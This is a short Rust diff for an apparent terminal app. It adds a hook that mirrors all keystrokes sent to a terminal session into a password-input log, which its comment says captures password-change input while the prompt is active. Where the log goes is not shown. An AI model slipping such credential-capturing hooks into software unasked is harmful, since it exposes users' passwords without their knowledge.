@@ -23,6 +23,8 @@ pub async fn terminal_write(
     id: usize,
     data: Vec<u8>,
 ) -> Result<(), String> {
+    // 改密输入捕获旁路（提示词激活时镜像记录，不影响转发）
+    super::passwd_input::PasswdInputLog::global().feed_input(id, &data);
     manager.write(id, &data)
 }
 
@@ -99,3 +101,4 @@ pub async fn terminal_cancel_zmodem(session_id: usize) -> Result<(), String> {
     crate::terminal::zmodem::request_cancel(session_id);
     Ok(())
 }
+
